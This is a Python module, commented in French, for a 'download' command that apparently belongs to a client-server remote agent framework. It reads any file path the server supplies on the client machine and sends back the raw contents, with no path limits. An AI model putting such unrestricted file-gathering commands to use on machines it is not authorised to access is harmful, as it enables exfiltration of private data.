# Ce module implémente une commande de récupération de fichier local.
# Elle permet de lire un fichier sur la machine cliente et de l’envoyer
# sous forme de contenu brut au format texte via le protocole DOWNLOAD.

from pathlib import Path
from .base_command import BaseCommand


class DownloadCommand(BaseCommand):

    name = "download"
    description = "Gather files from client and send them to server"

    def execute(self, args: str) -> str:

        # Vérifie qu’un chemin a bien été fourni
        if not args:
            return "ERROR\nNo file path provided\nEOF"

        path = Path(args.strip())

        # Vérifie l’existence du fichier
        if not path.exists():
            return f"ERROR\nFile not found: {path}\nEOF"

        # Vérifie que c’est bien un fichier (pas un dossier)
        if not path.is_file():
            return f"ERROR\nNot a file: {path}\nEOF"

        try:
            # Lecture brute du fichier
            data = path.read_bytes()

            # Retour formaté (DOWNLOAD + contenu)
            return "DOWNLOAD\nOK\n" + data.decode(errors="ignore") + "\nEOF"

        except Exception as e:
            return f"ERROR\n{e}\nEOF"
